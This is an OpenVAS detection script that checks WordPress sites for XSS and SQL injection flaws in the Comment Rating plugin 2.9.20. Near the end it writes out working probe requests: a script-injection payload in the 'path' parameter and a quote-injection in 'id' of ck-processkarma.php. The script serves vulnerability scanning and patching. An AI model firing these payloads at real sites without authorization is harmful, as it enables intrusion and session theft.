###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_comment_rating_plugin_mult_vuln.nasl 5888 2017-04-07 09:01:53Z teissa $
#
# WordPress Comment Rating Plugin Multiple Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to insert arbitrary
HTML and script code or cause SQL Injection attack to gain sensitive
information.

Impact Level: Application";

tag_affected = "WordPress Comment Rating plugin version 2.9.20";

tag_insight = "The flaws are due to an,
- Improper validation of user-supplied input passed to the 'id' parameter in
'/wp-content/plugins/comment-rating/ck-processkarma.php' before using it
in an SQL query, which allows attackers to execute arbitrary SQL commands
in the context of an affected site.
- Improper validation of user-supplied input passed to the 'path' parameter
in '/wp-content/plugins/comment-rating/ck-processkarma.php', which allows
attackers to execute arbitrary HTML and script code in a user's browser
session in the context of an affected site.";

tag_solution = "Upgrade to WordPress Comment Rating plugin version 2.9.24 or
later. For updates refer to http://wordpress.org/extend/plugins/comment-rating/";

tag_summary = "This host is running WordPress Comment Rating Plugin and prone
to cross site scripting and SQL injection vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802289";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 5888 $");
  script_bugtraq_id(51241);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-04-07 11:01:53 +0200 (Fri, 07 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-01-04 17:17:17 +0530 (Wed, 04 Jan 2012)");
  script_name("WordPress Comment Rating Plugin Multiple Vulnerabilities");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51241");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18303");
  script_xref(name : "URL" , value : "http://securityreason.com/exploitalert/11106");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108314/wpcommentrating-sqlxss.txt");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct attack request
url = dir + "/wp-content/plugins/comment-rating/ck-processkarma.php?id=2"+
     "&action=add&path=<script>alert(document.cookie)</script>&imgIndex=";

## Try XSS and check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, check_header: TRUE,
   pattern:"<script>alert\(document.cookie\)</script>"))
{
  security_message(port);
  exit(0);
}

## Construct SQL Injection
url = dir + "/wp-content/plugins/comment-rating/ck-processkarma.php?" +
     "id=2'&action=add&path=/&imgIndex=";

## Try SQL Injection and check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, check_header: TRUE,
   pattern:"You have an error in your SQL syntax;")) {
  security_message(port);
}
